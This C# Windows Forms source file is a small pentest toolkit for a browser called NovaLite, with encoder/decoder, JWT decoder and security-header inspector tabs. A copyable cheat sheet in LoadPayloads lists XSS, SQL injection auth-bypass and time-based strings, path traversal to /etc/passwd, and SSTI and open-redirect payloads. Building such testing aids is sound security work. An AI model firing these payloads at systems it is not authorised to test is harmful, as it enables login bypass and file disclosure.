using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace NovaBrowser {
    public class SecurityToolsForm : Form {
        private TabControl tabControl;

        // Encoder / Decoder controls
        private TextBox txtInput;
        private TextBox txtOutput;
        private ComboBox cmbOperation;
        private Button btnExecute;

        // Payload controls
        private ListBox lstPayloads;
        private ComboBox cmbCategory;
        private TextBox txtPayloadPreview;
        private Button btnCopyPayload;

        // Header checker controls
        private TextBox txtHeaderUrl;
        private Button btnCheckHeaders;
        private TextBox txtHeaderResult;

        public SecurityToolsForm(string currentUrl = "") {
            this.Text = "🛡️ NovaLite Security & Pentest Toolkit";
            this.Size = new Size(780, 560);
            this.StartPosition = FormStartPosition.CenterParent;
            this.BackColor = Color.FromArgb(15, 23, 42);
            this.ForeColor = Color.White;
            this.Font = new Font("Segoe UI", 9.5f);

            BuildUI(currentUrl);
        }

        private void BuildUI(string currentUrl) {
            tabControl = new TabControl() {
                Dock = DockStyle.Fill,
                Padding = new Point(12, 6)
            };

            // TAB 1: Encoder / Decoder / Hasher / JWT
            TabPage tabEncoder = new TabPage("🔤 Encoder / Decoder / JWT") {
                BackColor = Color.FromArgb(30, 41, 59),
                Padding = new Padding(12)
            };
            BuildEncoderTab(tabEncoder);
            tabControl.TabPages.Add(tabEncoder);

            // TAB 2: Payload Cheat Sheet
            TabPage tabPayloads = new TabPage("⚡ Payloads & Cheat Sheet") {
                BackColor = Color.FromArgb(30, 41, 59),
                Padding = new Padding(12)
            };
            BuildPayloadTab(tabPayloads);
            tabControl.TabPages.Add(tabPayloads);

            // TAB 3: Security Header Inspector
            TabPage tabHeaders = new TabPage("🔍 Security Headers Inspector") {
                BackColor = Color.FromArgb(30, 41, 59),
                Padding = new Padding(12)
            };
            BuildHeaderTab(tabHeaders, currentUrl);
            tabControl.TabPages.Add(tabHeaders);

            this.Controls.Add(tabControl);
        }

        private void BuildEncoderTab(TabPage page) {
            TableLayoutPanel layout = new TableLayoutPanel() {
                Dock = DockStyle.Fill,
                RowCount = 5,
                ColumnCount = 1
            };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 35));
            layout.RowStyles.Add(new RowStyle(SizeType.Percent, 45));
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 45));
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 25));
            layout.RowStyles.Add(new RowStyle(SizeType.Percent, 55));

            Label lblIn = new Label() { Text = "Teks Input:", AutoSize = true, ForeColor = Color.FromArgb(148, 163, 184) };
            txtInput = new TextBox() {
                Multiline = true,
                ScrollBars = ScrollBars.Vertical,
                Dock = DockStyle.Fill,
                BackColor = Color.FromArgb(15, 23, 42),
                ForeColor = Color.White,
                Font = new Font("Consolas", 10)
            };

            FlowLayoutPanel pnlAction = new FlowLayoutPanel() { Dock = DockStyle.Fill, WrapContents = false };
            cmbOperation = new ComboBox() {
                DropDownStyle = ComboBoxStyle.DropDownList,
                Width = 240,
                Font = new Font("Segoe UI", 10)
            };
            cmbOperation.Items.AddRange(new object[] {
                "URL Encode",
                "URL Decode",
                "Base64 Encode",
                "Base64 Decode",
                "Hex Encode",
                "Hex Decode",
                "HTML Entity Encode",
                "HTML Entity Decode",
                "MD5 Hash",
                "SHA256 Hash",
                "JWT Token Decoder (Header + Payload)"
            });
            cmbOperation.SelectedIndex = 0;

            btnExecute = new Button() {
                Text = "⚡ Proses",
                Width = 100,
                Height = 32,
                BackColor = Color.FromArgb(56, 189, 248),
                ForeColor = Color.Black,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 9.5f, FontStyle.Bold)
            };
            btnExecute.Click += (s, e) => ProcessEncoding();

            Button btnClear = new Button() {
                Text = "Bersihkan",
                Width = 90,
                Height = 32,
                BackColor = Color.FromArgb(71, 85, 105),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat
            };
            btnClear.Click += (s, e) => { txtInput.Clear(); txtOutput.Clear(); };

            pnlAction.Controls.Add(cmbOperation);
            pnlAction.Controls.Add(btnExecute);
            pnlAction.Controls.Add(btnClear);

            Label lblOut = new Label() { Text = "Hasil Output:", AutoSize = true, ForeColor = Color.FromArgb(148, 163, 184) };
            txtOutput = new TextBox() {
                Multiline = true,
                ScrollBars = ScrollBars.Vertical,
                Dock = DockStyle.Fill,
                BackColor = Color.FromArgb(15, 23, 42),
                ForeColor = Color.FromArgb(129, 230, 217),
                Font = new Font("Consolas", 10),
                ReadOnly = true
            };

            layout.Controls.Add(lblIn, 0, 0);
            layout.Controls.Add(txtInput, 0, 1);
            layout.Controls.Add(pnlAction, 0, 2);
            layout.Controls.Add(lblOut, 0, 3);
            layout.Controls.Add(txtOutput, 0, 4);

            page.Controls.Add(layout);
        }

        private void ProcessEncoding() {
            string input = txtInput.Text;
            if (string.IsNullOrEmpty(input)) {
                txtOutput.Text = "(Input masih kosong)";
                return;
            }

            try {
                string op = cmbOperation.SelectedItem.ToString();
                switch (op) {
                    case "URL Encode":
                        txtOutput.Text = Uri.EscapeDataString(input);
                        break;
                    case "URL Decode":
                        txtOutput.Text = Uri.UnescapeDataString(input);
                        break;
                    case "Base64 Encode":
                        txtOutput.Text = Convert.ToBase64String(Encoding.UTF8.GetBytes(input));
                        break;
                    case "Base64 Decode":
                        txtOutput.Text = Encoding.UTF8.GetString(Convert.FromBase64String(input.Trim()));
                        break;
                    case "Hex Encode":
                        var sbHex = new StringBuilder();
                        foreach (byte b in Encoding.UTF8.GetBytes(input)) {
                            sbHex.Append(b.ToString("x2"));
                        }
                        txtOutput.Text = sbHex.ToString();
                        break;
                    case "Hex Decode":
                        string hex = input.Replace(" ", "").Replace("0x", "").Trim();
                        byte[] bytes = new byte[hex.Length / 2];
                        for (int i = 0; i < bytes.Length; i++) {
                            bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
                        }
                        txtOutput.Text = Encoding.UTF8.GetString(bytes);
                        break;
                    case "HTML Entity Encode":
                        txtOutput.Text = WebUtility.HtmlEncode(input);
                        break;
                    case "HTML Entity Decode":
                        txtOutput.Text = WebUtility.HtmlDecode(input);
                        break;
                    case "MD5 Hash":
                        using (MD5 md5 = MD5.Create()) {
                            byte[] hashBytes = md5.ComputeHash(Encoding.UTF8.GetBytes(input));
                            txtOutput.Text = BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
                        }
                        break;
                    case "SHA256 Hash":
                        using (SHA256 sha = SHA256.Create()) {
                            byte[] hashBytes = sha.ComputeHash(Encoding.UTF8.GetBytes(input));
                            txtOutput.Text = BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
                        }
                        break;
                    case "JWT Token Decoder (Header + Payload)":
                        txtOutput.Text = DecodeJwt(input.Trim());
                        break;
                }
            } catch (Exception ex) {
                txtOutput.Text = "Error saat proses: " + ex.Message;
            }
        }

        private string DecodeJwt(string token) {
            string[] parts = token.Split('.');
            if (parts.Length < 2) return "Format token bukan JWT valid (harus terdiri dari part yang dipisah tanda titik).";

            var sb = new StringBuilder();
            sb.AppendLine("=== JWT HEADER ===");
            sb.AppendLine(DecodeBase64Url(parts[0]));
            sb.AppendLine("\n=== JWT PAYLOAD (CLAIMS) ===");
            sb.AppendLine(DecodeBase64Url(parts[1]));
            if (parts.Length > 2) {
                sb.AppendLine("\n=== JWT SIGNATURE (RAW) ===");
                sb.AppendLine(parts[2]);
            }
            return sb.ToString();
        }

        private string DecodeBase64Url(string input) {
            string output = input.Replace('-', '+').Replace('_', '/');
            switch (output.Length % 4) {
                case 0: break;
                case 2: output += "=="; break;
                case 3: output += "="; break;
                default: throw new FormatException("Format Base64Url tidak valid");
            }
            byte[] converted = Convert.FromBase64String(output);
            return Encoding.UTF8.GetString(converted);
        }

        private void BuildPayloadTab(TabPage page) {
            TableLayoutPanel layout = new TableLayoutPanel() {
                Dock = DockStyle.Fill,
                RowCount = 3,
                ColumnCount = 1
            };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 40));
            layout.RowStyles.Add(new RowStyle(SizeType.Percent, 60));
            layout.RowStyles.Add(new RowStyle(SizeType.Percent, 40));

            FlowLayoutPanel top = new FlowLayoutPanel() { Dock = DockStyle.Fill };
            Label lblCat = new Label() { Text = "Kategori:", AutoSize = true, Padding = new Padding(0, 6, 0, 0) };
            cmbCategory = new ComboBox() { DropDownStyle = ComboBoxStyle.DropDownList, Width = 220 };
            cmbCategory.Items.AddRange(new object[] {
                "XSS (Cross-Site Scripting)",
                "SQL Injection (Auth Bypass & Test)",
                "Path Traversal / LFI",
                "SSTI (Server-Side Template Injection)",
                "Open Redirect"
            });
            cmbCategory.SelectedIndex = 0;
            cmbCategory.SelectedIndexChanged += (s, e) => LoadPayloads();

            btnCopyPayload = new Button() {
                Text = "📋 Salin Payload",
                Width = 130,
                Height = 28,
                BackColor = Color.FromArgb(56, 189, 248),
                ForeColor = Color.Black,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 9, FontStyle.Bold)
            };
            btnCopyPayload.Click += (s, e) => {
                if (!string.IsNullOrEmpty(txtPayloadPreview.Text)) {
                    Clipboard.SetText(txtPayloadPreview.Text);
                    MessageBox.Show(this, "Payload berhasil disalin ke clipboard!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            };

            top.Controls.Add(lblCat);
            top.Controls.Add(cmbCategory);
            top.Controls.Add(btnCopyPayload);

            lstPayloads = new ListBox() {
                Dock = DockStyle.Fill,
                BackColor = Color.FromArgb(15, 23, 42),
                ForeColor = Color.White,
                Font = new Font("Consolas", 9.5f)
            };
            lstPayloads.SelectedIndexChanged += (s, e) => {
                if (lstPayloads.SelectedItem != null) {
                    txtPayloadPreview.Text = lstPayloads.SelectedItem.ToString();
                }
            };

            txtPayloadPreview = new TextBox() {
                Multiline = true,
                ScrollBars = ScrollBars.Vertical,
                Dock = DockStyle.Fill,
                BackColor = Color.FromArgb(15, 23, 42),
                ForeColor = Color.FromArgb(244, 114, 182),
                Font = new Font("Consolas", 10)
            };

            layout.Controls.Add(top, 0, 0);
            layout.Controls.Add(lstPayloads, 0, 1);
            layout.Controls.Add(txtPayloadPreview, 0, 2);

            page.Controls.Add(layout);
            LoadPayloads();
        }

        private void LoadPayloads() {
            lstPayloads.Items.Clear();
            string cat = cmbCategory.SelectedItem.ToString();
            if (cat.StartsWith("XSS")) {
                lstPayloads.Items.AddRange(new object[] {
                    "<script>alert(1)</script>",
                    "<script>alert(document.domain)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg/onload=alert(1)>",
                    "\"><script>alert(1)</script>",
                    "javascript:alert(1)",
                    "<iframe src=\"javascript:alert(1)\">",
                    "<body onload=alert(1)>",
                    "<input autofocus onfocus=alert(1)>",
                    "<details open ontoggle=alert(1)>"
                });
            } else if (cat.StartsWith("SQL")) {
                lstPayloads.Items.AddRange(new object[] {
                    "' OR '1'='1",
                    "' OR 1=1 --",
                    "admin' --",
                    "admin' #",
                    "' OR '1'='1' /*",
                    "\" OR 1=1 --",
                    "' UNION SELECT null, version(), user() --",
                    "'; WAITFOR DELAY '0:0:5' --",
                    "' OR pg_sleep(5) --",
                    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --"
                });
            } else if (cat.StartsWith("Path")) {
                lstPayloads.Items.AddRange(new object[] {
                    "../../../../etc/passwd",
                    "..\\..\\..\\..\\windows\\win.ini",
                    "/etc/passwd",
                    "C:\\windows\\win.ini",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd"
                });
            } else if (cat.StartsWith("SSTI")) {
                lstPayloads.Items.AddRange(new object[] {
                    "{{7*7}}",
                    "${7*7}",
                    "<%= 7*7 %>",
                    "#{7*7}",
                    "*{7*7}",
                    "{{config.items()}}",
                    "{{ ''.__class__.__mro__[2].__subclasses__() }}"
                });
            } else if (cat.StartsWith("Open")) {
                lstPayloads.Items.AddRange(new object[] {
                    "https://example.com",
                    "//example.com",
                    "/\\example.com",
                    "https://target.com@example.com",
                    "javascript:window.location='https://example.com'"
                });
            }
            if (lstPayloads.Items.Count > 0) lstPayloads.SelectedIndex = 0;
        }

        private void BuildHeaderTab(TabPage page, string currentUrl) {
            TableLayoutPanel layout = new TableLayoutPanel() {
                Dock = DockStyle.Fill,
                RowCount = 3,
                ColumnCount = 1
            };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 45));
            layout.RowStyles.Add(new RowStyle(SizeType.Percent, 100));

            FlowLayoutPanel top = new FlowLayoutPanel() { Dock = DockStyle.Fill, WrapContents = false };
            Label lblUrl = new Label() { Text = "URL Target:", AutoSize = true, Padding = new Padding(0, 8, 0, 0) };
            txtHeaderUrl = new TextBox() { Width = 400, Font = new Font("Segoe UI", 10), Text = currentUrl };
            btnCheckHeaders = new Button() {
                Text = "🔍 Analisis Header",
                Width = 140,
                Height = 30,
                BackColor = Color.FromArgb(56, 189, 248),
                ForeColor = Color.Black,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 9, FontStyle.Bold)
            };
            btnCheckHeaders.Click += (s, e) => AnalyzeHeaders();

            top.Controls.Add(lblUrl);
            top.Controls.Add(txtHeaderUrl);
            top.Controls.Add(btnCheckHeaders);

            txtHeaderResult = new TextBox() {
                Multiline = true,
                ScrollBars = ScrollBars.Vertical,
                Dock = DockStyle.Fill,
                BackColor = Color.FromArgb(15, 23, 42),
                ForeColor = Color.White,
                Font = new Font("Consolas", 9.5f),
                ReadOnly = true
            };

            layout.Controls.Add(top, 0, 0);
            layout.Controls.Add(txtHeaderResult, 0, 1);

            page.Controls.Add(layout);
        }

        private async void AnalyzeHeaders() {
            string url = txtHeaderUrl.Text.Trim();
            if (string.IsNullOrEmpty(url) || url.StartsWith("about:")) {
                txtHeaderResult.Text = "Masukkan URL http/https yang valid terlebih dahulu.";
                return;
            }
            if (!url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
                !url.StartsWith("https://", StringComparison.OrdinalIgnoreCase)) {
                url = "http://" + url;
            }

            txtHeaderResult.Text = "Mengirim HTTP HEAD request ke " + url + "...\n";

            try {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "HEAD";
                req.Timeout = 5000;
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 NovaLite/1.0";

                using (HttpWebResponse resp = (HttpWebResponse)await req.GetResponseAsync()) {
                    var sb = new StringBuilder();
                    sb.AppendLine("=== HASIL RESPON SERVER ===");
                    sb.AppendLine(string.Format("Status Code: {0} ({1})", (int)resp.StatusCode, resp.StatusDescription));
                    sb.AppendLine(string.Format("Server Header: {0}", resp.Headers["Server"] ?? "Tidak ditampilkan (Bagus)"));
                    sb.AppendLine(string.Format("X-Powered-By: {0}", resp.Headers["X-Powered-By"] ?? "Tidak ada (Bagus)"));
                    sb.AppendLine();

                    sb.AppendLine("=== EVALUASI HEADER KEAMANAN ===");
                    CheckHeader(sb, resp.Headers, "Content-Security-Policy", "Melindungi dari serangan XSS dan data injection.");
                    CheckHeader(sb, resp.Headers, "Strict-Transport-Security", "Memaksa koneksi HTTPS terenkripsi (HSTS).");
                    CheckHeader(sb, resp.Headers, "X-Frame-Options", "Melindungi dari Clickjacking (iframe embedding).");
                    CheckHeader(sb, resp.Headers, "X-Content-Type-Options", "Mencegah MIME-type sniffing.");
                    CheckHeader(sb, resp.Headers, "Referrer-Policy", "Mengontrol informasi referrer yang dikirim.");
                    CheckHeader(sb, resp.Headers, "Permissions-Policy", "Membatasi akses fitur browser (camera, mic, geolocation).");

                    sb.AppendLine();
                    sb.AppendLine("=== SEMUA RAW HEADERS ===");
                    foreach (string key in resp.Headers.AllKeys) {
                        sb.AppendLine(string.Format("{0}: {1}", key, resp.Headers[key]));
                    }

                    txtHeaderResult.Text = sb.ToString();
                }
            } catch (WebException wex) {
                if (wex.Response != null) {
                    using (var errResp = (HttpWebResponse)wex.Response) {
                        txtHeaderResult.Text = "Server merespons dengan status error: " + (int)errResp.StatusCode + " " + errResp.StatusDescription;
                    }
                } else {
                    txtHeaderResult.Text = "Koneksi gagal: " + wex.Message;
                }
            } catch (Exception ex) {
                txtHeaderResult.Text = "Error: " + ex.Message;
            }
        }

        private void CheckHeader(StringBuilder sb, WebHeaderCollection headers, string headerName, string description) {
            string val = headers[headerName];
            if (!string.IsNullOrEmpty(val)) {
                sb.AppendLine(" [ADA] " + headerName + ": " + val);
            } else {
                sb.AppendLine(" [TIDAK ADA] " + headerName + " -> Rekomendasi: Pasang header ini (" + description + ")");
            }
        }
    }
}

